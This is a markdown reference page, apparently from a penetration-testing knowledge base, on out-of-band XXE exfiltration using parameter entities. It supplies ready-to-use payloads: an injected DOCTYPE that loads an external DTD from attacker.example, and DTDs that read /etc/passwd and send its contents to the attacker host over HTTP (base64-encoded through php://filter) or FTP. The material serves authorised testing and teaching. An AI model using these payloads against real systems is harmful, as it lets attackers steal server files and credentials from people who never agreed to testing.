---
title: "Out-of-band XXE exfiltration with parameter entities"
description: "When nothing is reflected, parameter entities and an external DTD exfiltrate file contents to an attacker server over HTTP or FTP."
keywords:
  - out-of-band XXE
  - parameter entity
  - external DTD
  - OOB exfiltration
  - blind data recovery
---

# Out of band

When the application parses the XML but never reflects any parsed value, the in-band read fails: the file is fetched but its contents go nowhere visible. Out-of-band (OOB) XXE recovers data anyway by making the parser send the file to a server the attacker controls, over HTTP or FTP, as part of the URL it requests.

## Why parameter entities

A general entity reference like `&xxe;` cannot appear inside another entity's declared value in the internal subset, and most parsers reject attempts to nest general entities there. **Parameter entities** (`%name;`) are the mechanism designed for use inside DTDs, and they are the reliable way to build the exfiltration chain. The portable pattern keeps almost everything in an **external DTD** that the attacker hosts, because many parsers forbid a parameter entity reference inside a markup declaration in the internal subset but allow it in an external one.

The injected document stays small. It declares one parameter entity pointing at the attacker's DTD and then invokes it:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.example/evil.dtd">
  %xxe;
]>
<foo>bar</foo>
```

## The external DTD

`evil.dtd`, served from the attacker host, reads the target file into one parameter entity, then builds a second entity whose value is an attacker URL with the file contents embedded in the path. A third entity triggers the request:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example/log?x=%file;'>">
%eval;
%exfil;
```

The sequence is deliberate. `%file;` captures the file. `%eval;` is a nested declaration whose body, once `%file;` expands, defines `%exfil;` as a request to the collector with the data appended. `&#x25;` is the numeric reference for `%`, needed because a literal `%` inside an entity value would otherwise be parsed as a parameter-entity reference during declaration rather than when desired. Finally `%exfil;` forces the parser to resolve the SYSTEM URL, and the attacker reads the file contents from the inbound request log.

Base64-encoding the file with `php://filter` is important for OOB: raw newlines and reserved URL characters would corrupt or truncate the query string, and some bytes are illegal in XML entity values. Encoding yields a compact, URL-safe string.

## FTP for larger or awkward data

HTTP query strings are length-limited and stop at the first newline in many parsers. An attacker-run FTP listener avoids both problems and often captures multi-line content that HTTP exfiltration truncates:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.example:2121/%file;'>">
%eval;
%exfil;
```

The parser opens an FTP connection to the attacker's host and places the file contents in the requested path, which a simple listener records. FTP also sidesteps some outbound HTTP egress filtering. When all outbound network is blocked, move to an error-based or local-DTD technique instead.

## Tools

- **XXEinjector**: automating out-of-band exfiltration with a hosted DTD and FTP listener.
- **Burp Collaborator**: capturing out-of-band HTTP and DNS callbacks.
- Manual testing with a hosted external DTD and an FTP listener for larger data.

## References

- [OWASP: XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PayloadsAllTheThings: XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
